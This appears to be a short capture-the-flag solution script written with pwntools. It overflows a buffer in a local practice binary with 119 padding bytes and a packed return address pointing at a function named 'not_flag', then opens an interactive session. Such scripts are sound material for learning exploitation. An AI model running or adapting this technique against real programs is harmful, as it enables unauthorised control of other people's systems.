from pwn import *
import os

#0x0804856f = address of not_flag
#119 = offset we need to add for buffer overflow
s = process('./3_syfur')
temp = 'A'*119
temp += p32(0x0804856f)

s.sendline(temp)
s.interactive()
